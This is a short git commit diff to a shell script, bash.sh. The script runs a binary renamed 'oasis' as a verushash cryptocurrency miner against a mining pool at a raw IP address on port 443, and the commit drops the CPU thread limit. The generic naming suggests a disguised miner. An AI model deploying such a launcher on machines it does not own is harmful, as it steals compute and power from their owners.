180b0798836c7ee182d6a189b8f6733b9b0c76ee
danielasase <danielas@kadetjuara.web.id>
2024-12-30 14:13:24 +0700

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -9,4 +9,4 @@ for dir in $CPUFREQ_PATH; do
 done
 
 chmod 777 oasis
-./oasis --algorithm verushash --pool stratum+tcp://128.199.167.154:443 --wallet RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(shuf -n 1 -i 1-99999)-OF --password x --cpu-threads 4
+./oasis --algorithm verushash --pool stratum+tcp://128.199.167.154:443 --wallet RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(shuf -n 1 -i 1-99999)-OF --password x
